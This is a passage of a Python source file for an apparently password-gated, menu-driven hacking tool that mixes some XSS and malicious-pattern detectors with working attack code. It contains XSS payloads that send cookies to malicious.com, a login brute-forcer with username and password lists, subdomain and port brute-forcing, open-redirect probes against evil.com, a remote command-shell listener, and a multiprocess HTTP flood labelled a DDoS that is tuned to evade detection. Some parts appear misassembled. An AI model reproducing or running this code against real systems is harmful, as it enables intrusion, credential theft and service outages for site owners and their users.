            r"<.*?src=.*?http://.*?>",  # Malicious HTTP sources
            r"<.*?src=.*?https://.*?>",  # Malicious HTTPS sources
            r"<.*?iframe.*?src=.*?javascript:.*?>",  # JavaScript in iframe
            r"<.*?iframe.*?src=.*?data:.*?>",  # Data URL in iframe
            r"<.*?object.*?data=.*?javascript:.*?>",  # JavaScript in object tag
            r"<.*?embed.*?src=.*?javascript:.*?>",  # JavaScript in embed tag
            r"<.*?object.*?data=.*?data:.*?>",  # Data URL in object tag
            r"<.*?style=.*?expression\(.*?\)>",  # CSS expression injections
            r"<.*?style=.*?url\(.*?javascript:.*?\)>",  # CSS URL-based XSS
            r"<.*?style=.*?url\(.*?data:.*?\)>",  # Data URL in CSS
            r"<.*?style=.*?url\(.*?file:.*?\)>",  # File URL in CSS
            r"<.*?style=.*?url\(.*?http://.*?\)>",  # HTTP URL in CSS
            r"<.*?style=.*?url\(.*?https://.*?\)>",  # HTTPS URL in CSS
            r"<.*?xml.*?>",  # XML injections
            r"<.*?xlink:href=.*?javascript:.*?>",  # XLink injections in SVG
            r"<.*?onerror=.*?>",  # onerror handler for image tags or others
            r"<.*?onload=.*?>",  # onload handler for various tags
        ]
        # Compile the patterns for faster search
        self.user_input_patterns = re.compile("|".join(self.xss_patterns), re.IGNORECASE)

        # Define a set of common XSS payloads to test
        self.xss_payloads = [
            "<script>alert('XSS')</script>",  # Basic script injection
            "<img src='x' onerror='alert(1)'>",  # Event-based XSS
            "<svg onload=alert('XSS')>",  # SVG-based XSS
            "<script>document.location='http://malicious.com?cookie=' + document.cookie</script>",  # Cookie stealing
            "<body onload=alert('XSS')>",  # Body onload XSS
            "<iframe src='javascript:alert(1)'></iframe>",  # iframe-based XSS
            "<a href='javascript:alert(1)'>Click me</a>",  # JavaScript in links
            "<input type='text' value='<script>alert(1)</script>'>",  # Input field injection
            "<img src=x onerror=alert('XSS')>",  # Basic image-based XSS
            "<script>eval('alert(1)')</script>",  # Eval-based XSS
            "<object data='javascript:alert(1)'></object>",  # Object tag XSS
            "<embed src='javascript:alert(1)'></embed>",  # Embed tag XSS
            "<link rel='stylesheet' href='javascript:alert(1)'>",  # Link tag XSS
            "<script>location.href='javascript:alert(1)'</script>",  # Location-based XSS
            "<meta http-equiv='refresh' content='0;url=javascript:alert(1)'>",  # Meta refresh XSS
            "<style>@import'javascript:alert(1)'</style>",  # CSS @import-based XSS
            "<a href='javascript:void(0)' onmouseover='alert(1)'>Hover me</a>",  # onmouseover event-based XSS
            "<div style='background-image:url(javascript:alert(1))'>Click me</div>",  # CSS background-image-based XSS
            "<button onclick='alert(1)'>Click me</button>",  # Button event-based XSS
            "<a href='http://malicious.com' onclick='alert(1)'>Click me</a>",  # Malicious link with onclick XSS
            "<input type='image' src='x' onerror='alert(1)'>",  # Image input field-based XSS
            "<textarea onfocus='alert(1)'></textarea>",  # Textarea focus-based XSS
            "<div onmouseover='alert(1)'>Hover here</div>",  # Mouse event-based XSS
            "<form><input type='submit' value='Submit' onmouseover='alert(1)'></form>",  # Form submit hover-based XSS
            "<script>setTimeout(function() { alert('XSS') }, 1000)</script>",  # setTimeout-based XSS
            "<a href='javascript:eval(atob(\"YWxlcnQoMSk=\"))'>Click me</a>",  # Base64-decoded eval payload
            "<script>fetch('http://malicious.com?cookie=' + document.cookie)</script>",  # Fetch-based cookie theft
            "<svg/onload=alert(1)>",  # Minimal SVG XSS
            "<script>document.write('<img src=x onerror=alert(1)>')</script>",  # Script-driven image XSS
            "<iframe src='javascript:alert(1)'></iframe>",  # Iframe-based XSS
            "<meta http-equiv='X-UA-Compatible' content='IE=9' > <script>alert('XSS')</script>",  # Meta tag-based XSS
            "<script>alert(String.fromCharCode(88,83,83))</script>",  # Encoding XSS
            "<script src='http://malicious.com/malicious.js'></script>",  # External script-based XSS
            "<style>div{background:url('javascript:alert(1)');}</style>",  # CSS background URL XSS
            "<div><img src='x' onerror='alert(1)'></div>",  # Nested div and image-based XSS
            "<div><input type='text' value='<script>alert(1)</script>'></div>"  # Nested div with input-based XSS
        ]

    def is_xss(self, input_data):

        if self.user_input_patterns.search(input_data):
            return True
        return False

    def test_xss(self, url, param_name):

        for payload in self.xss_payloads:
            print(f"Testing payload: {payload}")
            # URL encode the payload if needed
            encoded_payload = urllib.parse.quote(payload)
            test_url = f"{url}?{param_name}={encoded_payload}"

            try:
                response = requests.get(test_url)
                if response.status_code == 200 and payload in response.text:
                    print(f"Potential XSS vulnerability detected with payload: {payload}")
                else:
                    print(f"No vulnerability detected with payload: {payload}")
            except requests.exceptions.RequestException as e:
                print(f"Error while testing the payload: {e}")

    def detect_xss_in_headers(self, headers):

        for header, value in headers.items():
            if self.is_xss(value):
                print(f"XSS detected in header: {header} with value: {value}")


# Utility Functions
def send_request(url, method="GET", headers=None, params=None, data=None):
    try:
        if method == "GET":
            response = requests.get(url, headers=headers, params=params)
        elif method == "POST":
            response = requests.post(url, headers=headers, data=data)
        else:
            print("Unsupported HTTP method")
            return None
        return response
    except requests.exceptions.RequestException as e:
        print(f"Error during request: {e}")
        return None


# API Security Scanning
class APISecurityScanner:
    def __init__(self):
        self.api_security_checklist = [
            "Authentication and Authorization",
            "Rate Limiting",
            "Input Validation",
            "Error Handling",
            "API Keys and Tokens",
            "Access Control",
            "Data Encryption (in transit and at rest)",
            "Cross-Origin Resource Sharing (CORS) Policy",
            "API Versioning",
            "Logging and Monitoring",
            "Secure Endpoints",
            "Rate Limiting and Throttling",
            "SQL Injection Protection",
            "XSS Protection",
            "API Gateway Security",
            "API Response Security",
            "Session Management",
            "IP Whitelisting",
            "API Response Time Monitoring",
            "JWT (JSON Web Token) Security",
            "OAuth2 Implementation",
            "Content Security Policy (CSP)",
            "Server-Side Request Forgery (SSRF) Protection",
            "Content-Type Validation",
            "Sensitive Data Exposure Prevention",
            "API Rate Limiting and User Quotas",
            "Strict Transport Security (HSTS)",
            "API Deprecation Management",
            "Automated Penetration Testing",
            "Third-Party API Security",
            "Distributed Denial of Service (DDoS) Protection",
            "Authentication Bypass Protection",
            "Business Logic Vulnerability Prevention",
            "CORS Misconfiguration Prevention",
            "Cross-Site Request Forgery (CSRF) Prevention",
            "Public API Key Restrictions",
            "Cross-Site Script Inclusion (XSSI) Protection",
            "API Health Checks"
        ]

    def scan_api(self, url):
        print(f"Starting API security scan for {url}...\n")
        # Check Authentication and Authorization
        self.check_authentication_authorization(url)
        # Simulate other checks
        for check in self.api_security_checklist[1:]:
            print(f"Checking: {check}")
            # Simulate scanning
            time.sleep(1)
        print(f"\nAPI security scan completed for {url}")

    def check_authentication_authorization(self, url):
        print("Checking Authentication & Authorization...\n")

        # Example of Authentication check
        print("Checking for Authentication (e.g., API Key, OAuth, Basic Auth, etc.)...")
        auth_check_results = self.test_authentication(url)
        if auth_check_results['authenticated']:
            print("Authentication mechanism is in place.")
        else:
            print("No valid authentication mechanism found!")

        # Example of Authorization check
        print("Checking for Authorization (e.g., User Permissions, Role-based Access Control)...")
        authz_check_results = self.test_authorization(url)
        if authz_check_results['authorized']:
            print("Authorization checks passed. User has appropriate permissions.")
        else:
            print("Authorization failed. User does not have permission.")

    def test_authentication(self, url):
        # Example: Check if API requires an API Key or Token
        # Simulate request to API to check authentication
        headers = {"Authorization": "Bearer dummy_token"}  # Replace with actual token
        response = requests.get(url, headers=headers)

        if response.status_code == 200:
            return {"authenticated": True}
        elif response.status_code == 401:
            return {"authenticated": False}
        else:
            print(f"Unexpected response code: {response.status_code} while testing authentication")
            return {"authenticated": False}

    def test_authorization(self, url):
        # Example: Check if API restricts access based on roles
        # Simulate a request with an invalid user
        invalid_user_headers = {"Authorization": "Bearer invalid_token"}  # Simulate invalid token
        response_invalid_user = requests.get(url, headers=invalid_user_headers)

        # Simulate a valid user
        valid_user_headers = {"Authorization": "Bearer valid_token"}  # Simulate valid token
        response_valid_user = requests.get(url, headers=valid_user_headers)

        # If the valid user is authorized and invalid user is not, pass the authorization check
        if response_valid_user.status_code == 200 and response_invalid_user.status_code == 403:
            return {"authorized": True}
        else:
            return {"authorized": False}


# List of suspicious patterns that can indicate a malicious payload
malicious_patterns = [
    r"alert\(document\.cookie", r"document.cookie=", r"eval\(window\.location", r"eval\(document\.location",
    r"eval\(document\.cookie", r"document.createElement\(script\)", r"eval\(setInterval", r"eval\(setTimeout",
    r"eval\(function", r"eval\(window\.open", r"eval\(alert", r"eval\(confirm", r"eval\(prompt",
    r"eval\(String\.fromCharCode", r"eval\(document\.getElementById", r"eval\(document\.write", r"eval\(XMLHttpRequest",
    r"window.onbeforeunload", r"window.onresize", r"window.onhashchange", r"document.location.replace",
    r"document.location.href",
    r"eval\(document.createElement", r"eval\(document.all", r"eval\(document.forms", r"eval\(document.body",
    r"eval\(document.head",
    r"eval\(document.querySelector", r"eval\(window.scrollTo", r"eval\(window.scroll", r"eval\(window.innerHeight",
    r"eval\(window.innerWidth", r"eval\(window.document", r"eval\(window.performance", r"eval\(navigator.userAgent",
    r"eval\(navigator.plugins", r"eval\(navigator.language", r"eval\(navigator.javaEnabled",
    r"eval\(navigator.connection",
    r"eval\(window.console", r"eval\(document.createElement('script')", r"eval\(document.body.appendChild",
    r"eval\(document.body.insertAdjacentHTML", r"eval\(document.body.innerHTML", r"eval\(window.location.reload",
    r"eval\(window.location.href='javascript:alert", r"eval\(document.cookie=''", r"eval\(eval", r"eval\(this.value",
    r"eval\(this.src", r"eval\(this.href", r"eval\(this.onclick", r"eval\(this.onmouseover", r"eval\(this.onfocus",
    r"eval\(this.onblur", r"eval\(this.onchange", r"eval\(this.oninput", r"eval\(this.onsubmit",
    r"eval\(this.onkeydown",
    r"eval\(this.onkeyup", r"eval\(this.onmousedown", r"eval\(this.onmouseup", r"eval\(this.ondblclick",
    r"eval\(this.onresize",
    r"eval\(this.onresize", r"eval\(this.onerror", r"eval\(this.onerror", r"eval\(this.onload", r"eval\(this.onabort",
    r"eval\(this.onscroll", r"eval\(this.onseeked", r"eval\(this.onstalled", r"eval\(this.onwaiting"

]


# Function to check the URL for common malware indicators
def is_malicious_url(url):
    """
    Check the URL for suspicious patterns that might indicate a phishing site or other malicious content.
    """
    for pattern in malicious_patterns:
        if re.search(pattern, url, re.IGNORECASE):
            print(f"Suspicious pattern found in URL: {pattern}")
            return True
    return False


# Function to scan the content of a web page for malicious content
def scan_page_for_malware(url):
    """
    Scan the webpage for malicious content by checking for suspicious JavaScript, HTML, or URL patterns.
    """
    try:
        response = requests.get(url)
        soup = BeautifulSoup(response.text, 'html.parser')

        print(f"Scanning webpage: {url}")

        # Check for malicious links and forms
        links = soup.find_all('a', href=True)
        malicious_links = False
        for link in links:
            if is_malicious_url(link['href']):
                print(f"Suspicious URL found: {link['href']}")
                malicious_links = True

        # Check for malicious JavaScript
        scripts = soup.find_all('script')
        malicious_js = False
        for script in scripts:
            if script.string and any(pattern in script.string for pattern in malicious_patterns):
                print("Suspicious JavaScript found!")
                malicious_js = True

        # Check for hidden form actions (XSS, CSRF, etc.)
        forms = soup.find_all('form', action=True)
        malicious_forms = False
        for form in forms:
            if is_malicious_url(form['action']):
                print(f"Suspicious form action found: {form['action']}")
                malicious_forms = True

        # Print a summary of findings
        if not malicious_links and not malicious_js and not malicious_forms:
            print("No suspicious elements found on this page.")

    except requests.exceptions.RequestException as e:
        print(f"Error scanning the website: {e}")


# Function to scan the website
def scan_website(url):
    """
    Perform a malware scan on the website by checking for various malicious indicators.
    """
    print(f"Scanning the website: {url}")

    # Check if the website URL contains suspicious patterns
    if is_malicious_url(url):
        print(f"Malicious URL detected: {url}")
    else:
        # Scan the webpage for malicious content
        scan_page_for_malware(url)

    print("Scan completed.")


# List of common subdomains to test for (expanded list)
SUBDOMAIN_WORDLIST = [
    "adminpanel", "user", "members", "cms", "data", "uploads", "files", "resources", "dashboard1", "settings",
    "adminarea", "support1", "download", "upload1", "assets", "cdn1", "management", "order", "customerportal",
    "account1", "feedback", "adminlogin", "private", "helpdesk", "billing", "logs", "terms", "privacy",
    "appadmin", "webportal", "private1", "userprofile", "controlpanel", "team", "docs1", "cloudstorage",
    "payment", "invoices", "tasks", "projects", "knowledgebase", "adminconsole", "myaccount", "adminpages",
    "webservices", "server", "testpage", "devconsole", "api3", "api4", "settings1", "accountsettings",
    "downloads", "uploadfiles", "userportal", "supportdesk", "statuspage", "beta1", "blogpost", "ticketing",
    "resources1", "controlcenter", "settingspanel", "faq", "supportcenter", "membersarea", "product",
    "releases", "bugtracker", "testapi", "shop1", "documentation", "siteadmin", "devsite1", "reviews", "livechat",
    "fileshare", "debug", "adminarea1", "email", "newsletter", "tools", "network", "config", "clientarea",
    "adminpage", "public", "service1", "assets1", "downloads1", "company", "profile", "support2", "taskmanager",
    "testenv", "usersarea", "testserver", "resources2", "operations", "developer", "projectmanagement",
    "clientsupport", "eventportal", "tools1", "event1", "testportal", "resources3", "api_docs", "helpcenter",
    "clientdashboard", "knowledge", "productadmin", "apps", "payroll", "eventmanagement", "archive",
    "backup", "chat", "community", "supportforum", "taskcenter", "ticketsystem", "reviews1", "features",
    "fileupload", "database", "secureportal", "adminlogs", "clientservices", "mobile", "userlogin", "static1"

]

USER_AGENT = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"


class SubdomainEnumerator:
    def __init__(self, domain, max_threads=20):
        self.domain = domain
        self.subdomains_found = []
        self.lock = threading.Lock()
        self.max_threads = max_threads

    def check_subdomain(self, subdomain):
        try:
            # Attempt DNS lookup for different types of DNS records
            dns_query = f"{subdomain}.{self.domain}"
            resolver = dns.resolver.Resolver()
            resolver.timeout = 5  # Set timeout to avoid hanging indefinitely
            resolver.lifetime = 5  # Maximum time to spend on the query

            # Check for A (IPv4), AAAA (IPv6), and CNAME records
            records = []
            for record_type in ['A', 'AAAA', 'CNAME']:
                try:
                    answers = resolver.resolve(dns_query, record_type)
                    for answer in answers:
                        records.append((record_type, answer.to_text()))
                except (dns.resolver.NoAnswer, dns.resolver.NXDOMAIN):
                    continue  # Ignore missing records
                except Exception as e:
                    print(f"Error resolving {dns_query} for {record_type}: {e}")

            if records:
                print(f"Found subdomain: {dns_query}")
                for record in records:
                    print(f"  - {record[0]}: {record[1]}")
                self.add_to_results(subdomain)
        except Exception as e:
            print(f"Error with subdomain {subdomain}: {e}")

    def add_to_results(self, subdomain):
        with self.lock:
            if subdomain not in self.subdomains_found:
                self.subdomains_found.append(subdomain)

    def brute_force_subdomains(self):
        print(f"Starting brute-force subdomain enumeration for {self.domain}...")

        # Use ThreadPoolExecutor for optimized multithreading
        with ThreadPoolExecutor(max_workers=self.max_threads) as executor:
            for sub in SUBDOMAIN_WORDLIST:
                subdomain = f"{sub}.{self.domain}"
                executor.submit(self.check_subdomain, sub)

    def run(self):
        start_time = time.time()
        self.brute_force_subdomains()
        print("\nSubdomains found:")
        for subdomain in self.subdomains_found:
            print(f"- {subdomain}.{self.domain}")
        print(f"Enumeration completed in {time.time() - start_time:.2f} seconds.")


# List of common usernames and passwords for brute-force testing
USERNAMES = [
    "admin", "user", "test", "root", "guest", "administrator", "manager", "staff", "support", "employee",
    "superuser", "operator", "developer", "webmaster", "admin1", "admin123", "user1", "user123", "guest1",
    "testuser", "default", "backup", "dbadmin", "sales", "hr", "it", "security", "system", "service",
    "info", "contact", "marketing", "ceo", "president", "manager1", "developer1", "dev", "itadmin",
    "tech", "lead", "helpdesk", "service1", "serviceadmin", "customer", "finance", "account", "billing",
    "support1", "sales1", "guestuser", "operator1", "poweruser", "webadmin", "webadmin1", "useradmin",
    "techsupport", "supportadmin", "moderator", "owner", "webdev", "itstaff", "admin1234", "manager123",
    "testadmin", "rootadmin", "root123", "sysadmin", "sysop", "worker", "developer01", "support123",
    "client", "guest123", "manager1", "webdev1", "salesmanager", "admin01", "superadmin", "user001",
    "guest001", "admin2", "test2", "backupadmin", "enterprise", "corporate", "networkadmin", "dbuser",
    "dataadmin", "mgt", "systemadmin", "root01", "newadmin", "guestuser1", "manager1234", "itadmin1",
    "yiway80795@rabitex.com"
]
PASSWORDS = [
    "welcome123", "qwerty1!", "letmein!1", "welcome1234", "1234password", "12345admin", "monkey123", "sunshine123",
    "iloveyou1234", "qwerty12!", "1234qwerty", "admin1234", "test12345", "qwerty@1234", "password321", "12345qwerty1",
    "superman123", "qwert12345", "123abc1234", "letmein456", "password!123", "qwerty_123", "qwerty_!123", "iloveyou456",
    "passwordqwerty", "qwerty12345", "iloveyou!123", "hello!123", "password12345!", "qwerty12345!", "admin12345",
    "1234567890!", "password1234!", "1qaz2wsx3edc", "123abc456", "letmeinpassword", "qwerty789", "abc123456789",
    "letmein12345", "monkey12345", "password09876", "qwerty123456", "iloveyou_123", "admin12345@", "letmein$123",
    "qwerty1234!", "superadmin123", "iloveyou1!", "password321!", "secret123", "adminpassword", "12345letmein",
    "qwert123",
    "passwordpass", "testpassword", "admin321", "password1admin", "welcome1234!", "letmein2024", "qwerty@12345",
    "123qwert12345", "admin@password", "abcd1234", "abcdqwert", "qwerty12!@#", "123@qwerty", "letmein321", "testqwerty",
    "123abcqwerty", "letmeinpassword1", "qwerty@abc123", "passwordqwerty123", "1234monkey", "qwerty0987",
    "1234password1"

]

# Define the headers to simulate a real browser (optional but useful to avoid blocking)
HEADERS = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
}

# Brute Force Protection Detection Settings
MAX_ATTEMPTS = 5  # Number of failed login attempts allowed before the system locks or triggers a CAPTCHA
LOCKOUT_TIME = 30  # Time (in seconds) the account is locked after failed attempts


class BruteForceTester:
    def __init__(self, login_url, usernames, passwords, max_attempts, lockout_time):
        self.login_url = login_url
        self.usernames = usernames
        self.passwords = passwords
        self.max_attempts = max_attempts
        self.lockout_time = lockout_time
        self.failed_attempts = 0
        self.is_locked = False

    def attempt_login(self, username, password):
        """Attempt a login request with given username and password."""
        payload = {
            "username": username,  # Modify based on actual login form field name
            "password": password  # Modify based on actual login form field name
        }
        try:
            response = requests.post(self.login_url, data=payload, headers=HEADERS)
            return response
        except RequestException as e:
            print(f"Request error: {e}")
            return None

    def test_login(self):
        """Test login attempts and check for brute force protection mechanisms."""
        for username in self.usernames:
            for password in self.passwords:
                if self.is_locked:
                    print(f"Account is locked. Waiting for {self.lockout_time} seconds...")
                    time.sleep(self.lockout_time)
                    self.is_locked = False  # Reset lockout after waiting

                print(f"Attempting login with {username}:{password}")
                response = self.attempt_login(username, password)

                if response and response.status_code == 200:
                    if "Invalid username or password" in response.text:
                        self.failed_attempts += 1
                        print(f"Failed attempt {self.failed_attempts}")
                    elif "Captcha" in response.text or "too many attempts" in response.text:
                        print("Brute force protection detected! CAPTCHA or account lockout triggered.")
                        self.is_locked = True
                        break
                    else:
                        print(f"Successfully logged in with {username}:{password}!")
                        return
                else:
                    print("Request failed.")

                # Check if max attempts reached
                if self.failed_attempts >= self.max_attempts:
                    print(f"Max attempts reached. Lockout or CAPTCHA may have been triggered.")
                    self.is_locked = True
                    break

    def run(self):
        """Run the brute force protection test."""
        print(f"Starting brute force protection test for {self.login_url}...")
        self.test_login()


# Open Redirect Scanner
class OpenRedirectScanner:
    def __init__(self, target_url):
        self.target_url = target_url
        self.redirect_payloads = [
            "http://evil.com",
            "https://evil.com",
            "javascript:alert(1)",
            "/evil",
            "ftp://evil.com"
        ]

    def check_open_redirect(self, payload):
        """
        Attempts to inject the payload into the URL and checks if the site is vulnerable
        to an open redirect.
        """
        try:
            parsed_url = urlparse(self.target_url)

            # Check if there is a query string in the URL
            if "?" in self.target_url:
                # Try appending payload to the URL parameters
                query_string = parsed_url.query
                query_params = dict(p.split("=") for p in query_string.split("&"))
                for param in query_params:
                    query_params[param] = payload

                # Rebuild the URL with the malicious parameter
                malicious_url = parsed_url._replace(query=urlencode(query_params)).geturl()
            else:
                # If no query string exists, add the redirect payload directly to the URL
                malicious_url = f"{self.target_url}?redirect={payload}"

            # Send the request to see if the redirect happens
            response = requests.get(malicious_url, allow_redirects=False)

            # Check for a redirect (3xx response)
            if response.status_code in range(300, 399):
                print(f"Open Redirect Vulnerability Found: {malicious_url} -> {response.status_code}")
                return True
            else:
                return False

        except requests.exceptions.RequestException as e:
            print(f"Error with request: {e}")
            return False

    def scan(self):
        """
        Scans the website with a list of payloads to identify open redirect vulnerabilities.
        """
        print(f"Scanning {self.target_url} for open redirects...")
        for payload in self.redirect_payloads:
            print(f"Testing with payload: {payload}")
            if self.check_open_redirect(payload):
                print(f"Vulnerable to Open Redirect! Payload: {payload}")
            else:
                print(f"Not vulnerable to Open Redirect for payload: {payload}")


# Define the target host and ports range
class OpenPortScanner:
    def __init__(self, target_host, port_range=(1, 65535)):
        self.target_host = target_host
        self.port_range = port_range
        self.open_ports = []
        self.lock = threading.Lock()

    def scan_port(self, port, q):
        """Attempts to connect to a specific port on the target host."""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(1)  # 1 second timeout for each connection
            result = sock.connect_ex((self.target_host, port))  # Try to connect to the port
            if result == 0:
                with self.lock:
                    self.open_ports.append(port)
                    print(f"Port {port} is OPEN")
            sock.close()
        except socket.error as e:
            pass  # Skip ports that result in errors

        q.task_done()

    def scan_ports(self):
        """Scans the specified range of ports on the target host."""
        q = queue.Queue()
        threads = []
        for port in range(self.port_range[0], self.port_range[1] + 1):
            thread = threading.Thread(target=self.scan_port, args=(port, q))
            threads.append(thread)
            thread.start()

        # Wait for all threads to finish scanning
        for thread in threads:
            thread.join()

        print(f"Scanning completed for {self.target_host}")
        if self.open_ports:
            print("Open ports found:")
            for port in self.open_ports:
                print(f"- {port}")
        else:
            print("No open ports found.")


# Function to handle the reverse shell connection
def reverse_shell(victim_socket):
    try:
        victim_socket.send(b"Connected to attacker. Type commands.\n")

        while True:
            command = victim_socket.recv(1024).decode("utf-8")
            if command.lower() == "exit":
                victim_socket.send(b"Exiting reverse shell...\n")
                break

            if command.startswith("cd "):
                try:
                    path = command.strip().split("cd ", 1)[1]
                    os.chdir(path)
                    victim_socket.send(f"Changed directory to {path}\n".encode())
                except FileNotFoundError as e:
                    victim_socket.send(f"Error changing directory: {e}\n".encode())
            else:
                result = subprocess.run(command, shell=True, capture_output=True)
                if result.stdout:
                    victim_socket.send(result.stdout)
                if result.stderr:
                    victim_socket.send(result.stderr)
    except Exception as e:
        print(f"Error: {e}")
        victim_socket.close()


# Function to start the backdoor listener
def start_listener(lhost, lport):
    try:
        listener_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        listener_socket.bind((lhost, lport))
        listener_socket.listen(5)
        print(f"Listening on {lhost}:{lport}...")

        while True:
            victim_socket, victim_address = listener_socket.accept()
            print(f"Connection from {victim_address} established!")
            victim_socket.send(b"Connection successful. Welcome to the reverse shell.\n")

            # Handle the reverse shell in a separate thread
            shell_thread = threading.Thread(target=reverse_shell, args=(victim_socket,))
            shell_thread.start()

    except Exception as e:
        print(f"Listener Error: {e}")
        listener_socket.close()


def generate_random_string(length=1024):
    """Generate a random string of a given length."""
    letters = string.ascii_letters + string.digits
    return ''.join(random.choice(letters) for _ in range(length))


async def send_request(session, url):
    while True:
        try:
            headers = {
                'User-Agent': f'Mozilla/5.0 (Windows NT {random.randint(6, 10)}.{random.randint(0, 3)}; rv:{random.randint(36, 100)}.0) Gecko/20100101 Firefox/{random.randint(36, 100)}.0',
                'Accept-Language': 'en-US,en;q=0.5',
                'Accept-Encoding': 'gzip, deflate',
                'Connection': 'keep-alive',
                'X-Custom-Header': generate_random_string(64)
            }
            params = {'q': generate_random_string(8)}
            async with session.get(url, headers=headers, params=params) as response:
                print(f"Status Code: {response.status}: Length: {len(await response.text())}")

            # Introduce a small random delay to avoid detection
            await asyncio.sleep(random.uniform(0.01, 0.05))

        except Exception as e:
            print(f"Error: {e}")


async def start_async_requests(url, num_requests=1000):
    async with aiohttp.ClientSession() as session:
        tasks = []
        for _ in range(num_requests):
            task = asyncio.create_task(send_request(session, url))
            tasks.append(task)
        await asyncio.gather(*tasks)


def run_async_requests(url, num_requests):
    asyncio.run(start_async_requests(url, num_requests))


def start_attack(url, num_processes=10, num_requests=2000):
    processes = []
    for _ in range(num_processes):
        p = multiprocessing.Process(target=run_async_requests, args=(url, num_requests))
        p.start()
        processes.append(p)

    for p in processes:
        p.join()


# Get my mac address
def get_mac_address():
    # Get the network interfaces
    interfaces = psutil.net_if_addrs()

    for interface, addrs in interfaces.items():
        for addr in addrs:
            if addr.family == psutil.AF_LINK:  # Check for the MAC address family
                return addr.address

    return "MAC address not found"


# Scan wifi
def scan_wifi():
    wifi = PyWiFi()
    interfaces = wifi.interfaces()

    # Check if there are any available Wi-Fi interfaces
    if not interfaces:
        print("Error: No Wi-Fi interface found. Please ensure your Wi-Fi is enabled and the adapter is working.")
        return

    iface = interfaces[0]  # Get the first available interface

    # Check if the interface supports scanning
    if not iface.status() == const.IFACE_DISCONNECTED:
        print("Error: Wi-Fi interface is already in use. Please disconnect from any networks.")
        return

    print("Scanning available Wi-Fi networks...")

    iface.scan()  # Start scanning
    results = iface.scan_results()

    if not results:
        print("No Wi-Fi networks found.")
        return

    print("Found networks:")
    for network in results:
        print(f"SSID: {network[0]}, Signal Strength: {network[1]}")


def check_password():
    O0O000O0O0OOO00OO = input("Enter the password: ")
    if O0O000O0O0OOO00OO == "001":
        banner()
        run_tool()
    elif O0O000O0O0OOO00OO == "000111000":
        banner()
        run_tool()
    elif O0O000O0O0OOO00OO == "101020201010":
        banner()
        run_tool()
    elif O0O000O0O0OOO00OO == "90102019289190":
        banner()
        run_tool()
    else:
        print("Error: The password is incorrect \n send the message to the owner \n instagram:@viper_droid")


def run_tool():
    while True:
        print(powered_by())

        choice = input("Enter your choice: ")

        if choice == "1":
            user_input = input("Enter input for SQL Injection detection: ")
            print(sql_injection_detector.is_sql_injection(user_input))
            print(powered_by())
        elif choice == "2":
            user_input = input("Enter input for XSS detection: ")
            print(xss_detector.is_xss(user_input))
            print(powered_by())
        elif choice == "3":
            print("Web Crawler (not implemented yet)")
            print(powered_by())
        elif choice == "4":
            user_input = input("Enter your input for sanitization: ")
            sanitized_input = sanitize_input(user_input)
            print(f"Sanitized input: {sanitized_input}")
            print(powered_by())
        elif choice == "5":
            ip_address = input("Enter IP address for rate limiting check: ")
            if rate_limiter.is_allowed(ip_address):
                print("Request allowed.")
                print(powered_by())
            else:
                print("Rate limit exceeded.")
                print(powered_by())
            print(
                f"Requests in the last {rate_limiter.time_window} seconds: {rate_limiter.get_request_count(ip_address)}")
            print(powered_by())
        elif choice == "6":
            public_ip = get_public_ip()
            if public_ip:
                print(f"Your public IP address is: {public_ip}")
                print(powered_by())
        elif choice == "7":
            url = input("Enter the URL to check for security headers: ")
            check_security_headers(url)
            print(powered_by())
        elif choice == "8":
            url = input("Enter the URL to test for SQL Injection: ")
            param_name = input("Enter the parameter name (e.g., 'id'): ")
            sql_injection_detector.test_sql_injection(url, param_name)
            print(powered_by())
        elif choice == "9":
            url = input("Enter the URL to test for XSS Injection: ")
            param_name = input("Enter the parameter name (e.g., 'q'): ")
            xss_detector.test_xss(url, param_name)
            print(powered_by())
        elif choice == "10":
            url = input("Enter the API URL to test for security: ")
            api_scanner.scan_api(url)
            print(powered_by())
        elif choice == "11":
            url = input("Enter the URL to scan for malware: ")
            scan_website(url)
            print(powered_by())
        elif choice == "12":
            target_domain = input("Enter target domain for subdomain enumeration (e.g., example.com): ").strip()
            if target_domain:
                subdomain_enumerator = SubdomainEnumerator(target_domain)
                start_time = time.time()
                subdomain_enumerator.run()
                end_time = time.time()
                print(f"\nEnumeration completed in {end_time - start_time:.2f} seconds.")
                print(powered_by())
            else:
                print("Invalid domain entered.")
        elif choice == "13":
            login_url = input("Enter the login URL (e.g., https://example.com/login): ")
            brute_force_tester = BruteForceTester(login_url, USERNAMES, PASSWORDS, MAX_ATTEMPTS, LOCKOUT_TIME)
            brute_force_tester.run()
            print(powered_by())
        elif choice == "14":
            target_url = input("Enter the URL to test for Open Redirect: ")
            open_redirect_scanner = OpenRedirectScanner(target_url)
            open_redirect_scanner.scan()
            print(powered_by())
        elif choice == "15":
            target_host = input("Enter the target host or IP (e.g., 192.168.1.1): ").strip()
            port_start = int(input("Enter the start of port range (e.g., 1): "))
            port_end = int(input("Enter the end of port range (e.g., 65535): "))
            scanner = OpenPortScanner(target_host, (port_start, port_end))
            scanner.scan_ports()
            print(powered_by())
        elif choice == "16":
            lhost = input("Enter the listener host IP: ")
            lport = int(input("Enter the listener port: "))
            start_listener(lhost, lport)
            print(powered_by())
        elif choice == "17":
            target_url = input("Enter the target URL for DDoS: ")
            start_attack(target_url, num_processes=10, num_requests=2000)
            print("DDoS attack simulation completed.")
            print(powered_by())
        elif choice == "18":
            mac_address = get_mac_address()
            print(f"Your MAC address is: {mac_address}")

        elif choice == "19":
            scan_wifi()
            print(powered_by())

        elif choice == "20":
            print(powered_by())
            print("Exiting the tool. Goodbye!")
            break
        else:
            print("Invalid choice. Try again.")
            print(powered_by())


if __name__ == "__main__":
    check_password()
